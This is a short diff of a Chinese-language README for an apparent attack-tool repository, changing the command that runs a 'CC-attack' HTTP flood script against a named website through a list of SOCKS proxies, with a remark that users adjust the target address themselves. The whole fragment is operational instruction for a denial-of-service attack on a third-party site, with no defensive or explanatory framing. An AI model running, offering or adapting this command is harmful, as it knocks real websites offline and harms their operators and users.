@@ -57,7 +57,7 @@ git clone https://github.com/NyaaCaster/HydaelynAttack.git
 
 ## 如果要单独一次性执行cc
 ```shell
-python3 ~/CC-attack/cc.py -url http://liwuhe51.top -f ~/socks4.txt -v 4 -s 30
+python3 ~/CC-attack/cc.py -url http://liwuhe51.top -f ~/proxy.txt -v 5 -s 30
 ```
 - 命令中地址自己根据情况调整目标网址
 
